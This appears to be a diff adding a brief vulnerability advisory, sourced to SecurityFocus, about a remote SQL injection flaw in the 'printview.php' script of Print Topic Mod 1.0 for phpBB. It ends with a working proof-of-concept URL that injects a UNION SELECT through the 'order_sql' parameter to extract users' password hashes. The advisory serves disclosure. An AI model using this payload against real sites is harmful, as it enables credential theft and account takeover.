@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/10757/info
+
+Print Topic Mod is reportedly affected by a remote SQL injection vulnerability in the 'printview.php' script. This issue is due to a failure of the application to properly sanitize user-supplied URI parameter input before using it in an SQL query.
+
+Print Topic Mod version 1.0 is reported to be affected by this issue. 
+
+http://www.example.com/printview.php?t={existing_topic's_id}&order_sql=UNION%20
+SELECT%201%20,%20user_password%20,%201,%201,%201,%201,%201,%201,%201,%201,%201,
+%201%20FROM%20{phpbb_users_table}%20WHERE%20user_id%20={some_user's_id}%20ORDER
+%20BY%20t.topic_id%20ASC 
